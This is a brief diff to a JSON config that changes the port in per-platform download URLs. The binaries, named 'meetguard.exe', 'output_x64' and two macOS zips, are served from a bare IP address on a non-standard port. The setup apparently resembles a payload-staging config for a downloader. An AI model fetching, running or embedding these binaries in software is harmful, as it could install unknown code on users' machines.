@@ -1,16 +1,16 @@
 {
   "linux": {
-    "url": "http://191.252.222.67:8081/output_x64"
+    "url": "http://191.252.222.67:8033/output_x64"
   },
   "windows": {
-    "url": "http://191.252.222.67:8081/meetguard.exe"
+    "url": "http://191.252.222.67:8033/meetguard.exe"
   },
   "macos": {
     "arm64": {
-      "url": "http://191.252.222.67:8081/ostmacarm.zip"
+      "url": "http://191.252.222.67:8033/ostmacarm.zip"
     },
     "x86_64": {
-      "url": "http://191.252.222.67:8081/ostmacx86.zip"
+      "url": "http://191.252.222.67:8033/ostmacx86.zip"
     }
   }
 }
